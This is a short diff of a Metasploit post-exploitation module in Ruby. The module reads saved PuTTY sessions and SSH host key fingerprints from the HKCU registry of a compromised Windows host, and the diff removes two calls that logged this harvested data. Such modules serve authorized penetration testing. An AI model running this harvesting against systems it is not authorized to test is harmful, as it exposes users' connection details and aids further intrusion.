@@ -43,7 +43,6 @@ class Metasploit3 < Msf::Post
             newses[key] = registry_getvaldata("HKCU\\Software\\SimonTatham\\PuTTY\\Sessions\\#{ses}", key).to_s
         end
         all_sessions << newses
-        report_note(host: target_host, type: "putty.savedsession", data: newses)
     end 
     all_sessions
   end
@@ -105,7 +104,6 @@ class Metasploit3 < Msf::Post
             all_ssh_host_keys[host_port] = [] if all_ssh_host_keys[host_port].nil?
             all_ssh_host_keys[host_port] << newkey['type']
         end
-        report_note(host: target_host, type: "putty.storedhostfp", data: newkey)
     end 
     all_ssh_host_keys
   end
